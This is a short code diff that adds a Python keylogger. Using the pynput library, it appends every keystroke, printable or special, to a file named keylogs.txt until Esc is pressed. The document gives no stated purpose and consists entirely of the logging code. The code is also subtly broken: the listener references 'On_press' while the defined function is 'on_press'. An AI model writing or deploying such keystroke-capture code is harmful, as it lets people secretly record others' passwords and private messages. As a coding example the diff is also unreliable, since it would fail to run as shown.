@@ -1,0 +1,13 @@
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    with open('keylogs.txt', 'a') as f:
+        try:
+            f.write(key.char)
+        except AttributeError:
+            f.write(str(key))
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=On_press) as listener:
+    listener.join()
